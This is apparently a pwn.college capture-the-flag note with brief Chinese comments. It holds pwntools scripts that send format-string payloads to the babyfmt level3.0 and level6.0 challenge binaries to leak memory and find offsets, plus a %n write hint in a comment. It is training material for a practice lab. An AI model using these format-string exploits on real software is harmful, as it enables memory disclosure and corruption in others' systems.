pwn.college

level3.0

from pwn import *;
tt = 40
a = [0]*tt
p = process("/challenge/babyfmt_level3.0")
p.send(f"%30$s".encode().ljust(9,b'a')+p64(0x404110))
p.interactive()
'''
for i in range(1,tt):
p = process("/challenge/babyfmt_level3.0")
p.send(f"%{i}$p.".encode().ljust(9,b'a') + p64(0x404110))
p.recvuntil("on your data!\n")
p.recvline()
a[i] = p.recvline()
p.kill()
for i in range(1,tt):
print(i,a[i])'''

这道题不能直接p.interactive(),输入太长ssh一直会断，直接打印输出即可，动调代码：

from pwn import *
tt = 70
a = [0]*tt
i=53
for j in range(tt-20,tt):
    p = process("/challenge/babyfmt_level6.0")
    p.send(f"%10$*{j}c%26$p%29${j}x".encode().ljust(26,b'a')+p64(0x404170))
    try:
        p.recvuntil("on your data!\n")
    except EOFError:
        print("程序已经崩溃，读不到输出了")#p.recvuntil("on your data!\n")
        p.kill()
        continue
    try:
        p.recvline()
    except EOFError:
        print("程序已经崩溃，读不到输出了")#p.recvuntil("on your data!\n")
        p.kill()
        continue
    a[j] = p.recvuntil('And now,')
    p.kill()
for i in range(tt-20,tt):
    print(i,a[i])
p.interactive() #%10$*61c%30$n
'''
for i in range(tt-20,tt):
